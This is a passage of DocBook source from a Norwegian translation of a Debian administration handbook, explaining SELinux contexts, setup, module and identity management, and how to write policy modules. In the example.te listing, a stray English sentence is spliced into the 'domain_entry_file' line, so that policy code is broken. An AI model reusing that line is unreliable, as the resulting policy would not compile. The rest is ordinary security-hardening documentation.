    #include &lt;abstractions/base&gt;
    #include &lt;abstractions/bash&gt;

    /bin/dash rix,
    /etc/dhcp/dhclient-enter-hooks.d/* r,
    /etc/dhcp/dhclient-exit-hooks.d/* r,
    /sbin/dhclient-script r,

  }
}
      </programlisting>
    </section>
  </section>

  <section id="sect.selinux">
    <title>Introduksjon til SELinux</title>
    <indexterm><primary>SELinux</primary></indexterm>
    <section id="sect.selinux-principles">
      <title>Prinsipper</title>

      <para>SELinux (<emphasis>Security Enhanced Linux</emphasis>) er et <emphasis>Mandatory Access Control</emphasis>-system som bygger på Linux sin LSM (<emphasis>Linux Security Modules</emphasis>)-grensesnitt. I praksis spør kjernen SELinux før hver systempåkalling for å vite om prosessen er autorisert til å gjøre den gitte operasjonen.</para>

      <para>SELinux bruker et sett med regler - kollektivt kjent som en <emphasis>policy</emphasis> - for å godkjenne eller forby operasjoner. Disse reglene er vanskelige å lage. Heldigvis er to standardregler (<emphasis>targeted (målrettet)</emphasis> og <emphasis>strict (strengt)</emphasis>) laget for å unngå mesteparten av konfigurasjonsarbeidet.</para>

      <para>Med SELinux er håndteringen av rettighetene helt forskjellig fra tradisjonelle Unix-systemer. Rettighetene til en prosess er avhengig av sin <emphasis>sikkerhetskontekst </emphasis>. Denne konteksten er definert av <emphasis>identitet</emphasis> til brukeren som startet prosessen, <emphasis>rolle</emphasis> og <emphasis>domene</emphasis> som brukeren hadde med seg på det tidspunktet. Rettighetene er egentlig avhengig av domenet, men overgangene mellom domenene er kontrollert av rollene. Til slutt; de mulige overgangene mellom roller avhenger av identiteten.</para>

      <figure>
        <title>Sikkerhetskontekster og Unix-brukere</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-context.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>I praksis får brukeren, under innlogging, tildelt en standard sikkerhetskontekst (avhengig av hvilke roller de skal være i stand til å støtte). Dette definerer det gjeldende domenet, og dermed domenet som alle nye avleggerprosesser vil ha. Hvis du ønsker å endre nåværende rolle og tilhørende domene, må du påkalle <command>newrole -r <replaceable>rolle_r</replaceable> -t <replaceable>domene_t</replaceable></command> (det er vanligvis bare ett enkelt domene som er tillatt for en gitt rolle, <literal>-t</literal>-parameteren kan derfor utelates). Denne kommandoen godkjenner du ved å be deg skrive inn passordet ditt. Denne funksjonen forbyr programmer å automatisk bytte roller. Slike endringer kan bare skje dersom de er uttrykkelig tillatt i SELinux-politikk.</para>

      <para>Obviously the rights do not apply to all
      <emphasis>objects</emphasis> (files, directories, sockets, devices,
      etc.). They can vary from object to object. To achieve this, each
      object is associated to a <emphasis>type</emphasis> (this is known as
      labeling). Domains' rights are thus expressed with sets of
      (dis)allowed operations on those types (and, indirectly, on all
      objects which are labeled with the given type).</para>

      <sidebar>
        <title><emphasis>EKSTRA</emphasis> Domener og typer er er likeverdige</title>

	<para>Internt er et domene bare en type, men en type som bare gjelder for prosesser. Det er derfor domener har suffikset <literal>_t</literal>, akkurat likt objektenes typer.</para>
      </sidebar>

      <para>Som standard arver et program sitt domene fra brukeren som startet det, men standard SELinux-politikk forventer at mange viktige programmer kjører i øremerkede domener. For å oppnå dette er disse kjørbare filer merket med en øremerket type (for eksempel er <command>ssh_t</command> merket med <literal>ssh_exec_t</literal>, og når et program starter, skifter det automatisk til <literal>ssh_t</literal>-domenet). Denne automatiske domene-overgangsmekanismen gjør det mulig å gi bare de rettigheter som kreves av hvert program. Dette er et grunnleggende prinsipp for SELinux.</para>

      <figure>
        <title>Automatiske overganger mellom domener</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-transitions.png" scalefit="1" width="35%" />
          </imageobject>
        </mediaobject>
      </figure>

      <sidebar>
        <title><emphasis>I PRAKSIS  </emphasis> Å finne sikkerhetskonteksten</title>
        <indexterm><primary>sikkerhetskontekst</primary></indexterm>
        <indexterm><primary>kontekst, sikkerhetskontekst </primary></indexterm>
        <indexterm><primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary></indexterm>

	<para>To find the security context of a given process, you should
	use the <literal>Z</literal> option of
	<command>ps</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput>
</screen>

	<para>Det første feltet inneholder identitet, rolle, domenet og MCS-nivå, atskilt med kolon. MCS-nivået (<emphasis>Multi-Category Security</emphasis>) er et parameter som griper inn i oppsettet av en taushetsbeskyttelsespolitikk, som regulerer tilgang til filer basert på deres følsomhet. Denne funksjonen blir ikke forklart i denne boken.</para>

	<para>For å finne den gjeldende sikkerhetskonteksten i et skall, bør du påkalle <command>id -Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>

	<para>Til slutt, for å finne en type knyttet til en fil, kan du bruke <command>ls -Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
<computeroutput>unconfined_u:object_r:user_home_t:s0 test
     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput>
</screen>

	<para>Det er verdt å merke seg at identitet og rolle tilordnet til en fil, ikke har noen spesiell betydning (de er aldri brukt), men av hensyn til ensartetheten blir alle objekter tildelt en komplett sikkerhetskontekst.</para>
      </sidebar>
    </section>
    <section id="sect.selinux-setup">
      <title>Å sette opp SELinux</title>

      <para>SELinux-støtte er innebygd i standardkjernene som følger med Debian. Kjernen i Unix-verktøyet støtter SELinux uten noen modifikasjoner. Det er dermed relativt enkelt å aktivere SELinux.</para>

      <para>Kommandoen <command>apt install selinux-basics selinux-policy-default</command> vil automatisk installere de nødvendige pakkene til å konfigurere et SELinux-system.</para>

      <sidebar>
        <title><emphasis>VÆR VARSOM</emphasis> Referansepolitikken er ikke i Jessie</title>
        <para>Uheldigvis, vedlikeholderne av <emphasis role="pkg">refpolicy</emphasis>-kildepakken håndterte ikke utsending av kritiske feil i sin pakke, og pakken ble fjernet fra Jessie. Dette betyr at <emphasis role="pkg">selinux-policy-*</emphasis>-pakkene for øyeblikket ikke er installerbare i Jessie, og må hentes fra et annet sted. Forhåpentligvis vil de komme tilbake i en av punktversjonene, eller i Jessie-backports. I mellomtiden kan du hente dem fra ustabil-versjonen.</para>
        <para>Denne triste situasjonen beviser i det minste at SELinux er ikke veldig populær i blant brukere/utviklere som kjører utviklingsversjoner av Debian. Dermed, hvis du velger å bruke SELinux, bør du forvente at standardregelen ikke fungerer perfekt, og at du blir nødt til å investere litt tid for å gjøre den egnet til dine spesifikke behov.</para>
      </sidebar>

      <para>Pakken <emphasis role="pkg">selinux-policy-default</emphasis> inneholder et sett med vanlige regler. Som standard begrenser disse reglene kun tilgang til noen allment synlige tjenester. Brukersesjoner er ikke begrenset, og det er derfor usannsynlig at SELinux ville blokkere legitime brukeroperasjoner. Men dette forbedrer sikkerheten i systemtjenester som kjører på maskinen. For å sette opp et opplegg som tilsvarer de gamle «strenge» reglene, er det bare å deaktivere <literal>unconfined</literal>-modulen (modulhåndtering er beskrevet nærmere i denne seksjonen).</para>

      <para>Når opplegget er installert, bør du merke alle tilgjengelige filer (som betyr å tildele dem en type). Denne operasjonen må startes manuelt med <command>fixfiles relabel</command>.</para>

      <para>SELinux-systemet er nå klart. For å aktivere det bør du legge <literal>selinux=1 security=selinux</literal>-parameteret til Linux-kjernen. Parameteret <literal>audit=1</literal> aktiverer SELinux-logging med registrering av alle de nektede operasjonene. Endelig tar <literal>enforcing=1</literal>-parameteret reglene i bruk: Uten det virker SELinux i sin standard <emphasis>permissive/givende</emphasis>-modus der avviste handlinger logges, men fremdeles blir utført. Du bør derfor endre GRUBs oppstartskonfigurasjonsfil ved å legge til de ønskede parametere. En enkel måte å gjøre dette på er å modifisere  <literal>GRUB_CMDLINE_LINUX</literal>-variabelen i <filename>/etc/default/grub</filename>, og å kjøre <command>update-grub</command>. SELinux vil være aktivert etter en omstart.</para>

      <para>Det er verdt å merke seg at <command>selinux-activate</command>-skriptet automatiserer disse operasjonene, og tvinger en merking ved neste oppstart (som unngår nye ikke-merkede filer som er opprettet mens SELinux ennå ikke var aktiv, og mens merking skjer).</para>
    </section>
    <section id="sect.selinux-management">
      <title>Å håndtere SELinux-system</title>
      <indexterm><primary><command>semodule</command></primary></indexterm>
      <indexterm><primary><command>semanage</command></primary></indexterm>

      <para>SELinux-opplegget er et modulbasert sett med regler, og installasjonen oppdager og aktiverer automatisk alle relevante moduler basert på den allerede installerte tjenesten. Systemet er dermed umiddelbart i drift. Men når en tjeneste er installert etter SELinux-opplegget, må du klare å aktivere den tilsvarende modulen manuelt. Det er hensikten med <command>semodule</command>-kommandoen. Videre kan du klare å definere rollene som hver bruker kan slutte seg til, og dette kan gjøres med <command>semanage</command>-kommandoen.</para>

      <para>De to kommandoer kan dermed brukes til å endre den gjeldende SELinux-konfigurasjonen, lagret i <filename>/etc/selinux/default/</filename>. I motsetning til andre konfigurasjonsfiler du finner i <filename>/etc/</filename>, skal ikke alle disse filene endres for hånd. Du bør bruke programmer som er laget til dette formålet.</para>

      <sidebar>
        <title><emphasis>FOR VIDEREKOMMENDE</emphasis> Mer dokumentasjon</title>

	<para>Ettersom NSA ikke gir noen offisiell dokumentasjon, har fellesskapet satt opp en Wiki for å kompensere. Den bringer sammen en masse informasjon, men du må være klar over at de fleste SELinux-bidragsytere er Fedora-brukere (der SELinux er aktivert som standard). Dokumentasjonen tenderer dermed til å håndtere spesielt denne distribusjonen. <ulink type="block" url="http://www.selinuxproject.org" /></para>

	<para>Du bør også ta en titt på den dedikerte Debian Wiki-siden, samt Russell Cokers blogg, som er en av de mest aktive Debian-utviklere som jobber med SELinux-støtte. <ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" /></para>
      </sidebar>
      <section>
        <title>Å håndtere SELinux-moduler</title>

	<para>Tilgjengelige SELinux-moduler er lagret i <filename>/usr/share/selinux/default/</filename>-mappen. For å aktivere en av disse modulene i den gjeldende konfigurasjonen bør du bruke <command>semodule -i <replaceable>modul.pp.bz2</replaceable></command>.  Forlengelsen <emphasis>pp.bz2</emphasis> står for <emphasis>policy package (pakke)</emphasis> (komprimert med bzip2).</para>

	<para>Å fjerne en modul fra den gjeldende konfigurasjonen gjøres med <command>semodule -r <replaceable>modul</replaceable></command>. Til slutt, lister <command>semodule -l</command>-kommandoen modulene som er installert. De gir også sine versjonsnumre. Moduler kan selektivt aktiveres med <command>semodule -e</command>, og slås av med <command>semodule -d</command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0   Disabled
accountsd       1.1.0   
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0
accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput>
</screen>

	<para><command>semodule</command> laster umiddelbart den nye konfigurasjonen om ikke du bruker dens <literal>-n</literal>-valg.  Det er verdt å merke seg at programmet er standard på den gjeldende konfigurasjonen (som er angitt av <literal>SELINUXTYPE</literal>-variabelen i <filename>/etc/selinux/config</filename>), men at du kan endre en annen ved å spesifisere den med <literal>-s</literal>-valget.</para>
      </section>
      <section>
        <title>Å håndtere identiteter</title>

	<para>Hver gang en bruker logger inn, får de tildelt en SELinux-identitet. Denne identiteten definerer rollene de kan støtte. Disse to adressingene (fra brukeren til identiteten, og fra denne identiteten til roller) kan konfigureres med <command>semanage</command>-kommandoen.</para>

	<para>Du bør absolutt lese manualsiden <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry>, selv om kommando-syntaksen tenderer til å være lik for alle begrepene som håndteres. Du vil finne vanlige valg til alle underkommandoer:<literal>-a</literal> for å legge til, <literal>-d</literal> for å trekke fra (slette), <literal>-m</literal> for å modifisere, <literal>-l</literal> til å liste, og <literal>-t</literal> for å indikere en type (eller et domene).</para>

	<para><command>semanage login -l</command> lister gjeldende adressering mellom brukeridentifikatorer og SELinux-identiteter. Brukere som ikke har noen eksplisitt inngang, får identiteten angitt i <literal>__default__</literal>-inngangen. <command>semanage login -a -s user_u <replaceable>bruker</replaceable></command>-kommandoen vil knytte <emphasis>user_u</emphasis>-identiteten til den gitte brukeren. Tilslutt, <command>semanage login -d <replaceable>bruker</replaceable></command> dropper asdresseringsinngangen knyttet til denne brukeren.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
<computeroutput>
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         SystemLow-SystemHigh *
rhertzog             user_u               SystemLow            *
root                 unconfined_u         SystemLow-SystemHigh *
system_u             system_u             SystemLow-SystemHigh *
# </computeroutput><userinput>semanage login -d rhertzog</userinput> 
</screen>

	<para><command>semanage user -l</command> viser adresseringen mellom SELinux-brukeridentiteter og tillatte roller. Å legge til en ny identitet krever å definere både de tilsvarende rollene og en merkingsforstavelse som brukes til å tilordne en type til personlige filer (<filename>/home/<replaceable>bruker</replaceable>/*</filename>). Forstavelsen må velges mellom <literal>user</literal>, <literal>staff</literal>, og <literal>sysadm</literal>.  «<literal>staff</literal>»-forstavelsen resulterer i filer av typen  «<literal>staff_home_dir_t</literal>». Å lage en ny SELinux-brukeridentitet gjøres med <command>semanage user -a -R <replaceable>roller</replaceable> -P <replaceable>prefiks</replaceable> <replaceable>identitet</replaceable></command>. Til slutt; du kan fjerne en SELinux-brukeridentitet med <command>semanage user -d <replaceable>identitet</replaceable></command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
<computeroutput>
                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles

root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
system_u        user       SystemLow  SystemLow-SystemHigh  system_r
test_u          staff      SystemLow  SystemLow             staff_r user_r
unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
user_u          user       SystemLow  SystemLow             user_r
# </computeroutput><userinput>semanage user -d test_u</userinput>
</screen>
      </section>
      <section>
        <title>Å håndtere filkontekster, porter og boolske verdier</title>

	<para>Hver SELinux-modul har et sett av filmerkingsregler, men det er også mulig å legge til egendefinerte regler for merking for å ta hensyn til et bestemt tilfelle. For eksempel, hvis du vil at nett-tjeneren, for å kunne lese filene i <filename>/srv/www/</filename>-filhierarkiet, kan du kjøre <command>semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"</command> fulgt av <command>restorecon -R /srv/www/</command>. Førstnevnte kommando registrerer nye regler for merking, og sistnevnte tilbakestiller filtypene etter gjeldende regler for merking.</para>

	<para>Tilsvarende er TCP/UDP-portene merket på en måte som sikrer at bare de tilsvarende nissene kan lytte til dem. For eksempel, hvis du vil at nett-tjeneren skal kunne lytte på port 8080, bør du kjøre <command>semanage port -m -t http_port_t -p tcp 8080</command>.</para>

	<para>Noen SELinux-moduler eksporterer boolske valg som du kan justere for å endre gjøremålene til standardreglene. <command>getsebool</command>-verktøyet kan brukes til å inspisere disse valgene (<command>getsebool <replaceable>boolsk</replaceable></command> viser ett valg, og <command>getsebool -a</command> alle). <command>setsebool <replaceable>boolsk</replaceable> <replaceable>verdt</replaceable></command>-kommandoen endrer den gjeldende verdien av et boolsk alternativ. <literal>-P</literal>-valget gjør endringen permanent. Det betyr at den nye verdien blir standard, og blir beholdt etter restart. Eksempelet nedenfor gir nett-tjenere tilgang til hjemmeområder (dette er nyttig når brukerne har personlige nettsteder i <filename>~/public_html/</filename>).</para>

        <screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; off
# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>
</screen>
      </section>
    </section>
    <section id="sect.selinux-custom-rules">
      <title>Å tilpasse reglene</title>

      <para>Siden SELinux-opplegget er modulbasert, kan det være interessant å utvikle nye moduler for (muligens tilpassede) programmer som mangler dem. Disse nye modulene vil da komplettere <emphasis>referanseregler</emphasis>.</para>

      <para>For å lage nye moduler kreves <emphasis role="pkg">selinux-policy-dev</emphasis>-pakken så vel som <emphasis role="pkg">selinux-policy-doc</emphasis>. Den siste inneholder dokumentasjonen om standardreglene (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) og eksempelfiler som kan brukes som maler for å lage nye moduler. Installer disse filene, og studer dem nærmere:</para>

      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>
</screen>

      <para>Filen <filename>.te</filename> er den viktigste. Den definerer reglene. Filen <filename>.fc</filename> definerer «filkonteksten»; det er typene som er tilordnet filer knyttet til denne modulen. Dataene innenfor <filename>.fc</filename>-filen brukes under filmerkingstrinnet. Endelig definerer <filename>.if</filename>-filen modulens grensesnitt. Det er et sett med «offentlige funksjoner» som andre moduler kan bruke til en riktig samhandling med modulen du oppretter.</para>
      <section>
        <title>Å skrive en <filename>.fc</filename>-fil</title>

	<para>Å lese eksemplet nedenfor bør være tilstrekkelig til å forstå strukturen i en slik fil. Du kan bruke vanlige uttrykk for å tilordne den samme sikkerhetskonteksten til flere filer, eller til og med til et helt katalogtre.</para>

        <example>
          <title><filename>example.fc</filename> file</title>

          <programlisting role="scale"># myapp executable will have:
# label: system_u:object_r:myapp_exec_t
# MLS sensitivity: s0
# MCS categories: &lt;none&gt;

/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)
</programlisting>
        </example>
      </section>
      <section>
        <title>Å skrive en <filename>.if</filename>-fil</title>

	<para>I eksemplet nedenfor kontrollerer det første grensesnittet (“<literal>myapp_domtrans</literal>”) hvem som kan kjøre programmet. Det andre («<literal>myapp_read_log</literal>») gir leserettigheter til programmets loggfiler.</para>

	<para>Hvert grensesnitt må generere et gyldig sett med regler som kan legges inn i en <filename>.te</filename>-fil. Du bør derfor formidle alle typene du bruker (med <literal>gen_require</literal>-makro), og bruke standard direktiver for å gi rettigheter. Vær imidlertid oppmerksom på at du kan bruke grensesnitt som tilbys av andre moduler. Den neste seksjonen vil gi flere forklaringer om hvordan disse rettighetene skal uttrykkes.</para>

        <example>
          <title><filename>example.if</filename> File</title>

          <programlisting>## &lt;summary&gt;Myapp example policy&lt;/summary&gt;
## &lt;desc&gt;
##      &lt;p&gt;
##              More descriptive text about myapp.  The &lt;desc&gt;
##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;
##              html tags for formatting.
##      &lt;/p&gt;
##      &lt;p&gt;
##              This policy supports the following myapp features:
##              &lt;ul&gt;
##              &lt;li&gt;Feature A&lt;/li&gt;
##              &lt;li&gt;Feature B&lt;/li&gt;
##              &lt;li&gt;Feature C&lt;/li&gt;
##              &lt;/ul&gt;
##      &lt;/p&gt;
## &lt;/desc&gt;
#

########################################
## &lt;summary&gt;
##      Execute a domain transition to run myapp.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to transition.
## &lt;/param&gt;
#
interface(`myapp_domtrans',`
        gen_require(`
                type myapp_t, myapp_exec_t;
        ')

        domtrans_pattern($1,myapp_exec_t,myapp_t)
')

########################################
## &lt;summary&gt;
##      Read myapp log files.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to read the log files.
## &lt;/param&gt;
#
interface(`myapp_read_log',`
        gen_require(`
                type myapp_log_t;
        ')

        logging_search_logs($1)
        allow $1 myapp_log_t:file r_file_perms;
')
</programlisting>
        </example>

        <sidebar>
          <title><emphasis>DOKUMENTASJON</emphasis> Forklaringer om <emphasis>referanseregler</emphasis></title>

	  <para><emphasis>Referanseregler</emphasis> utvikler seg som alle fri programvareprosjekt: basert på frivillige bidrag. Tresys er vert for prosjektet, et av de mest aktive selskapene på SELinux-feltet. Wikien deres har forklaringer på hvordan reglene er strukturert, og hvordan du kan lage nye. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" /></para>
        </sidebar>
      </section>
      <section id="sect.writing-a-te-file">
        <title>Å skrive en <filename>.te</filename>-fil</title>

	<para>Have a look at the <filename>example.te</filename>
	file:</para>

        <sidebar>
          <title><emphasis>FOR VIDEREKOMMENDE</emphasis> Med makrospråket  <command>m4</command></title>

	  <para>For å strukturere opplegget riktig brukte SELinux-utviklerne en makro-kommandoprosessor. I stedet for å duplisere mange lignende <emphasis>tillat</emphasis>-direktiver, laget de «makrofunksjoner» for å bruke en høyere-nivå logikk, som også resulterer i et mye mer lesbart opplegg.</para>

	  <para>I praksis blir <command>m4</command> brukt til å sette sammen disse reglene. Den gjør den motsatte operasjonen: Den utvider alle disse høyt-nivå direktivene inn i en stor database med <emphasis>allow</emphasis>-direktiver.</para>

	  <para>SELinux-«grensesnittene» er bare makrofunksjoner som vil bli erstattet av et sett med regler på kompileringstidspunktet. På samme måte er noen rettigheter faktisk sett av rettigheter som er byttet ut med sine verdier på kompileringstidspunktet.</para>
        </sidebar>

        <programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>

########################################
#
# Declarations
#

type myapp_t; <co id="example.te.type"></co>
type myapp_exec_t;
domain_type(myapp_t)
domain_entry_file(myapp_t, myappLikewise, some rights are in fact sets of rights which are replaced by their values at compilation time._exec_t) <co id="example.te.domain"></co>

type myapp_log_t;
logging_log_file(myapp_log_t) <co id="example.te.interface"></co>

type myapp_tmp_t;
files_tmp_file(myapp_tmp_t)

########################################
#
# Myapp local policy
#

allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>

allow myapp_t myapp_tmp_t:file manage_file_perms;
files_tmp_filetrans(myapp_t,myapp_tmp_t,file)</programlisting>
        <calloutlist>
          <callout arearefs="example.te.module">
	    <para>Modulen må identifiseres med navn og versjonsnummer. Dette direktivet er nødvendig.</para>
          </callout>
          <callout arearefs="example.te.type">
	    <para>Hvis modulen introduserer nye typer, må den si ifra om dem med direktiver som dette. Ikke nøl med å lage så mange typer som kreves i stedet for å gi for mange ubrukelige rettigheter.</para>
          </callout>
          <callout arearefs="example.te.domain">
	    <para>Disse grensesnittene definerer <literal>myapp_t</literal>-typen som et prosessdomene som skal brukes av alle kjørbare merket med <literal>myapp_exec_t</literal>. Implisitt legger de til en <literal>exec_type</literal>-attributt til disse objektene, som igjen tillater andre moduler å tildele rettigheter til å kjøre disse programmene, for eksempel tillater <literal>userdomain</literal>-modulen prosesser med domene <literal>user_t</literal>, <literal>staff_t</literal>, og <literal>sysadm_t</literal> til å kjøre dem. Domenene til andre avstengte programmer vil ikke ha rettigheter til å kjøre dem, med mindre reglene gir dem lignende rettigheter (dette er tilfelle, for eksempel, med <command>dpkg</command> med sitt <literal>dpkg_t</literal>-domene).</para>
          </callout>
          <callout arearefs="example.te.interface">
	    <para><literal>logging_log_file</literal> er et grensesnitt som tilbys av referanseopplegget. Det indikerer at filene som er merket med den gitte typen er loggfiler¸ som burde dra nytte av de tilhørende reglene (for eksempel å gi rettigheter til <command>logrotate</command> slik at den kan håndtere dem).</para>
          </callout>
          <callout arearefs="example.te.allow">
	    <para><literal>allow</literal>-direktivet er basen direktivet bruker til å godkjenne en operasjon. Den første parameteren er prosessdomenet som har lov til å utføre operasjonen. Det andre definerer objektet som en prosess som det tidligere domenet kan håndtere. Denne parameteren har formen “<replaceable>type</replaceable>:<replaceable>class</replaceable>“ der <replaceable>type</replaceable> er dens SELinux-type, og <replaceable>class</replaceable> beskriver hva slags objekt (fil, mappe, socket, fifi, etc.). Til slutt beskriver den siste parameteren tillatelsene (de tillatte operasjonene).</para>

	    <para>Tillatelser er definert som et sett av tillatte operasjoner og følger denne malen: <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>. Men du kan også bruke makroer som representerer de nyttigste tillatelsene.<filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> lister dem.</para>

	    <para>Følgende nettside gir en relativt uttømmende liste over objektklasser og tillatelser som kan gis. <ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" /></para>
          </callout>
        </calloutlist>

	<para>Nå er det bare å finne det minimalt settet med regler som kreves for å sikre at målprogrammet eller tjenesten fungerer som det skal. For å oppnå dette, bør du ha god kunnskap om hvordan programmet fungerer og hva slags data det styrer og/eller genererer.</para>

	<para>Imidlertid er en empirisk tilnærming mulig. Etter at de relevante objektene er korrekt merket, kan du bruke programmet i tillatelsesmodus: Operasjonene som vil bli forbudt blir logget, men vil likevel lykkes. Ved å analysere loggene, kan du nå identifisere operasjoner som skal tillates. Her er et eksempel på en slik loggoppføring :</para>

        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1
</programlisting>

	<para>For bedre å forstå dette budskapet, la oss studere det bit for bit.</para>

        <table colsep="1">
          <title>Analyse av et SELinux-spor</title>
          <tgroup cols="2">
            <thead>
              <row>
                <entry>Budskap</entry>
                <entry>Beskrivelse</entry>
              </row>
            </thead>
            <tbody>
              <row>
                <entry>
                  <computeroutput>avc: denied</computeroutput>
                </entry>
                <entry>En operasjon er nektet.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>{ read write }</computeroutput>
                </entry>
                <entry>Denne operasjonen krevde <literal>read</literal> og <literal>write</literal>-tillatelsene.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>pid=1876</computeroutput>
                </entry>
                <entry>Prosessen med PID 1876 kjørte operasjonen (eller forsøkt å utføre den).</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>comm="syslogd"</computeroutput>
                </entry>
                <entry>Prosessen var et tilfelle med <literal>syslogd</literal> programmet.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>name="xconsole"</computeroutput>
                </entry>
                <entry>Målobjektet ble navngitt <literal>xconsole</literal>. Noen ganger kan du også ha en "sti"-variabel - med hele banen - i stedet.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>dev=tmpfs</computeroutput>
                </entry>
                <entry>Enheten som er vert for målobjektet er et <literal>tmpfs</literal> (et i-minne filsystem). Med en ekte disk, kan du se at partisjonen er vert for objektet (for eksempel: "sda3").</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>ino=5510</computeroutput>
                </entry>
                <entry>Objektet er identifisert med inode nummer 5510.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput>
                </entry>
                <entry>Dette er sikkerhetskonteksten for prosessen som utførte operasjonen.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput>
                </entry>
                <entry>Dette er sikkerehetskontektsen til målobjektet.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>tclass=fifo_file</computeroutput>
                </entry>
                <entry>Målobjektet er en FIFO-fil.</entry>
              </row>
            </tbody>
          </tgroup>
        </table>

	<para>Ved å observere dette i loggen, er et det mulig å bygge regel som ville tillate denne operasjonen. For eksempel <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. Denne prosessen kan automatiseres, og det er akkurat hva <command>audit2allow</command>-kommandoen (i <emphasis role="pkg">policycoreutils</emphasis>-pakken) tilbyr. Denne tilnærmingen er et bare nyttig hvis de ulike objektene allerede er korrekt merket med det som måtte være begrenset. I alle fall må du lese nøye gjennom de genererte reglene og validere dem i henhold til dine kunnskaper om programmet. Effektivt, tenderer denne tilnærmingen til å gi flere rettigheter enn det som er virkelig nødvendig. Den riktige løsningen er ofte å lage nye typer og for å tildele rettigheter bare til disse typene. Det hender også at en nektet operasjon er fatalt for programmet, og da kan det være bedre å bare legge til “<literal>dontaudit</literal>” en regel for å unngå loggoppføringen til tross for en effektiv nektelse.</para>

        <sidebar>
          <title><emphasis>COMPLEMENTS</emphasis> Ingen roller i oppleggsreglene</title>
          <indexterm><primary>Type Enforcement</primary></indexterm>
          <indexterm><primary>Enforcement, Type Enforcement</primary></indexterm>

	  <para>Det kan virke merkelig at rollene ikke vises i det hele tatt, når du oppretter nye regler. SELinux bruker bare domenene for å finne ut hvilke operasjoner som er tillatt. Rollen griper bare indirekte inn ved å tillate brukeren å bytte til et annet domene. SELinux er basert på en teori som kalles <emphasis>Type Enforcement</emphasis> og typen er det eneste elementet som teller når du gir rettigheter.</para>
        </sidebar>
